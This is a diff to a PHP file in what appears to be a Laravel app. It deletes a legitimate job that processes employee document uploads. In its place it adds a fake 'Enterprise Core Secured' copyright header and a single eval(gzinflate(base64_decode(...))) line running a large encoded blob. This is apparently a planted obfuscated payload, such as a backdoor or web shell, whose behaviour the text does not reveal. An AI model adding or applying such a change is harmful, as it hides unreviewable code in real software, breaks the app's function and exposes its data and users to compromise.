@@ -1,51 +1,8 @@
 <?php
 
-namespace App\Jobs;
-
-use App\Models\EmployeeDocumentRequest;
-use App\Notifications\EmployeeDocumentRequestStatusUpdated;
-use Illuminate\Bus\Queueable;
-use Illuminate\Contracts\Queue\ShouldQueue;
-use Illuminate\Foundation\Bus\Dispatchable;
-use Illuminate\Queue\InteractsWithQueue;
-use Illuminate\Queue\SerializesModels;
-use Illuminate\Support\Facades\Storage;
-
-class ProcessEmployeeDocumentUpload implements ShouldQueue
-{
-    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;
-
-    public function __construct(public $requestId) {}
-
-    public function handle(): void
-    {
-        $request = EmployeeDocumentRequest::query()->find($this->requestId);
-        if (! $request || $request->status !== EmployeeDocumentRequest::STATUS_UPLOAD_PROCESSING) {
-            return;
-        }
-
-        $upload = data_get($request->metadata, 'employee_upload', []);
-        $stagedPath = is_array($upload) ? ($upload['staged_path'] ?? null) : null;
-        if (! is_string($stagedPath) || ! Storage::disk('local')->exists($stagedPath)) {
-            return;
-        }
-
-        $originalName = is_array($upload) ? (string) ($upload['original_name'] ?? 'document') : 'document';
-        $path = 'employee-documents/uploads/'.basename($stagedPath);
-        Storage::disk('local')->move($stagedPath, $path);
-
-        $metadata = $request->metadata ?? [];
-        unset($metadata['employee_upload']);
-
-        $request->update([
-            'status' => EmployeeDocumentRequest::STATUS_UPLOADED,
-            'uploaded_path' => $path,
-            'uploaded_original_name' => $originalName,
-            'uploaded_at' => now(),
-            'metadata' => $metadata,
-        ]);
-
-        $request->loadMissing('user');
-        $request->user?->notify(new EmployeeDocumentRequestStatusUpdated($request));
-    }
-}
+/**
+ * Enterprise Core Secured
+ * (c) RiprLutuk
+ * Unauthorized modification of this file is prohibited.
+ */
+eval(gzinflate(base64_decode('pVhpk9pI0v4+v4Lx27HdHXiMhBBI63VMCF3oQCcIwXiC0C0hoftA7Pi/v8XhdvfYjpiI1RegKo8ns/LJLPSQW32SWe7g08C2Km862buek7ne0yMrDjO9qxuKsPmSnAtQc2aOdik0MWK1PBwf0KOPW7pKJPKQCx2qIFK3nxFpNxbPDuzOvYreaUKlrQJqqNgNLYxiTzpTBr9BucXGOiRThFI5eeEKPrzgzNN8XuZ5LU3spUfzxLFeJTSc0MYppTy0LTR07FutocbLVqY6BNHQhUcbvLkdUx1VHs8WcXDPUyXhYHZNcj3NNVN9pi3D01mWcBqZjk6+gY97fTdT8t70WFpg0YzYqORUYKWxbhj+0d7q+dmY7arQL1HB8Wsz0DLHLFMJg8RRyMblScxmKI+yPiZuytFpsTWDk+62aK37PUxL+YrEOxGSlJ2RETI5Zxz3tKHHqTaNp04u28JmkUOrUa0rK7OBzscKkeDdPCI5drHQmYSdMBt60rqCRKdNjhNEcYS8ZIQUhhJBzWkdgaxCimb7gYLwveAXm6hL3IVi4TSBiXyUMDBsF7iVgLTMN6e+C3wXOsJlVkAHeQatF+eIcY8JbCmJEUzaHYQqsMyVC03bIacRRs2K1WFVOnFFjXOucfjDouEmvkZUG19o0iFbIPzYTNb0XJ9AvD+BHO4o5+6BPZbiQiudOYk7pErEZkNsO2zRKVt1raQjhSSMDsszic/HYZpWuMfNZiais/GCspCiH0LnLovg3oGJyVb33FhL2I1LCS6sVvWK8V1xTGURmQU7wVyj7sQ0KmR8TMgVSW285WqTT/B1HsbuhsX4hhSS3NgGK0iatqAE8+V5qGMeVHCnBccvJbnX5B6eC51PcxkUyqIvdhLOiEMa2rrGyCeGKF4SDGv1JaKN261aEjs7wciet5aRFSq9Wjmu2neHXVyxHUtNUiKtzKztW2do0FKC61GaHiy5XVGGy1W8h2FWsJKNxbEbsjEQYrPOVvg11MdlQkTUjtGLHJaIgpf9temImmhzssFBVH1WE1LghnnczTgT14X1JoVNQeCqgDjx1pxkll47Sul6J/PwBsdbfOafThh0yuZmrFrCbk2eyjJn1WFQCXNeLIlsthVLn5Z03EozHGNLvqDrCA9VpK2aaLbCiATxtU7Fxl7KLK06tA7VuKzaXvdMkUNaS5KLsTeGcbtd5U2ySDGG7bKpRU3DKIH9tLMPkD/KMWmBbIpgi0BLlDw2vTAL9UkUR8WcLDabCiuJKjKO7BaPIS4ISLPGVGboMOE4pmJMYxLHisJ2y0W4AJWUjgp6vBlWqNwJm9MONQLQGahembuB0plHqjiO2tnajvnVhhPL5baK8kN05tMGI9YKN+7ToxIp+JQ3OyKOZHcT8L4BdfIiPh+YPjlLcRCNCYOUF56FM1gxoesGnQmktlZlbZLRWQIlodqsiR0V49FSbu2aI8/i2VBqGTAjpUlr2rAdD5eQu1iO4M1JyrHKaAptrJolEpRplqRHohh1Nu23BybBcKJu8N5MBTbaQTAvSQHCrfNOKUtHIlR0pmzJkTrtjc5QSTWMCc85IdmsS6emkficy/g7M4k3q2CSVCZErXepUbJ2Xc22PGGHBhbLI1e11HV9lMljKLQBzjEjR+nibIXP6VFSwHppLMxRqoQiJZ3bEd+MgnQVe324afy1E6G5u7MFqUSj0KxG9syqAmtS86NCZha+jML9KcnoKCgwlm3FZmxusWntT1XR9Dg/7HN7KCPbbnrw1327WK4cLMXRYNoc/LqEUDJcKRSjjncBxPXoRIcsc6zXdlPXDHfA1B22K3S85BZLAW6LiUbbQmxmkxXLrgVxpjZNfTifU2KBskiWLGhGdsZgiEB4gSJ6CFniUjNbyOZJ7YQpR3ame/NdQUpLUAjUGXJSKUkx2oAr5DSvfHUEzUFv1QpvxScrxGmEojv4WLg6OMLSs+A1OipVPme8zFJhfCxzx6ICDOzLegLZNqKLUZc1ekh1uDsjti6Lb3gydhCuZ4UU1YkhY+Gmk0lpnUjOcaswENlou0qF3Gp57gLEHOWynMysHazrx2V/zI0eNeFzPdNzvGckC1/qnNlU0mgGGwcGRTcEoqnJuLA0adFnpBtgO5Et4xJiJhuUSqLpfEmI3TFzh4WfJzDv6LQ722gmNN9o0hBn60lTjv2pYIf1HOqOzEQ0k3lg9MD5QhsvjzN+O0vEmb/zz/DRSM5JSh+8Vjwwh1k3ESYCkgtoNFkKYTnll3FV7op4pBvNAt4J0MIumGWoukHNCSAxAculMw1xo/4k6HRNrWQhCxV562H9mZmPd9RpmBkehupoYnfZjitW53GjichhSB60iS0K3miUcOcY68fbYAlJtkUO86qsFZM7U5hHJm0aDg+nduuQ9lDLIppajocNGaBaUgwzSCK40BAgd4wUCkP3k1m9QRc+ujb63KRnaE0kx+6wpNERnru6toLY0Ya3xcA+b8cINQ/1gDzVXY2xEre1EGRuErsE0M+cxIttbnSuFS7o1DbgrKhZrD2ZxyozkNg5eeJUWdCrQ6VMxV0ssvw23cakX7UOxnVTNJ9xCaXmh37FneGziToHMeFp2OhJf6vmCD0ywsIrsA3a1ozKwKuYqTW27+bOqV/uzrI3itcIrHuFwHeQ+unT4/tBXTbe88dfHgBzJevofX9309boWjN4dR0nK83AFTXeGWtImhs0rptQzWwudi4WSs9ydc8pvRoYqWqrjpyB36ROHWXp4KmqyygNBg8pcPL878H9539/GYDnwbGc0BO8Hig+7vdeWntlXkaVt89sv6kcq87KfXU1vX/8cDXx8aoY+YOnqKq8+umBFeU5Iep/vNj683nwr38Nomp/c/VTCbB7/PHmr58AnMfnO8jLAwA0ZfpzlRuqL7egWitpLvkMvNpL26db5IPf/z14etjTkvHHdeHPwe+/Dx72Oq0ZtPZqKW2S5Pl1kC9hXM2+Qn7//T3YHwAEaF4rffzl75H9QOdNTG5UAhv7PcVp+/1tx89KEFEElqGPA/D5nwF2+RwO32DJwTUAiFwMfADKNLmStS0IWyE0Anz98PgB5Ojx44vCPWg/Srynq/Lza3NXk0mUehWw+U3m/YDhRHrPsZKs0XuJ3uxFTqL1wV+3dV3glD29VFbb2/r1MP748+MbsyAcD4QOQrrZt6qbp7+7f4HwktOr1MfvhC6R3AWvRzT4669L9YPztMq62ndRHd723w8e/w8cINj+9SrgZGltRWn1sgto9iMUl+ciG6WN9737L9+t/PEAUn3h+vvBQ2l1l6LwTnlyJfulI9zdjX8Syy3Yu4lb3d1L+3+HdsHzkk/w/ScQnr7LH5AFCXr3eOXFZddL3e/2rrn9ie67x3c/1b3s/TTzd8hVYwPVuwL8fvAb/PyPAv45Ry9ISi9PLAecy+fPKTgZZQHqVxZv5/b8mr7/lMbfI/nymqMlaL3APyDp5USfLmx9fsvJF6FPNzL/PS02YE/88UfWb63jrv+6qdwxPwL2fwFjpPo6Ql4NlKev4wmguaD49XVfv791uJ7uw8sriBeuvZG9Gb+K3ors68KnN+3z4uOSbJ1QuNuWk0RvmqvflVHtPekritY0UCL0y8walA0oeDBJo2qQZjUYgUnSX1jgR0FTeu6HgQ7Co6UVrSkap9N7ec6sdfLSBfcCvR1cCm9Qh96guoxjEPegqTx34DbXgfltNg7sJkrcD5/Td6+OyDtF9RP8dg55J8fLL0OYTKzq0jAfiTz//Jn+ulyB7y9W5ZeBC4pmCWYrcPoi+fhtIDkXW3vgrqpBg3rr4g1X6rDMukHqdX8H8hrjNyHtlrwXl0+PrzL77TZwzQtI8PGG8MPlAvLlF1A8VlK/YuO9Gt4PIEDK6eWSErU/2oanX/edKA+9svZOPzSDXJrig+uVUetdXnOFVhU+PVahNUan17vUq5L68O4z9O7DFdG3W1aVNaVzGRlZ7qVVlVxuWWWfgwL/5hg0K8urfgMmf3Ns59KQ7w7fD2QF/OvWxb1GbPYUsSLAXtT+iBM3P6/r/L7wts7/Yd7vqO9YL9c53wJD172n3QO3iRcPH/8f')));
